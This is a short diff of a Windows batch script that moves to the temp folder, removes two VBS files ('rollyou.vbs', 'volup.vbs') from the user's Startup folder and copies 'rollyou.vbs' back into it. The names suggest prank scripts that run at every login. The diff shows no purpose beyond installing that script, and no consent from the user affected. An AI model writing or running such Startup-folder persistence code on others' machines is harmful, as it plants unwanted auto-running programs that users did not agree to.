@@ -1,4 +1,4 @@
-cd D:\
+cd %tmp%
 del "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\rollyou.vbs"
 del "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\volup.vbs"
 copy rollyou.vbs "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\"
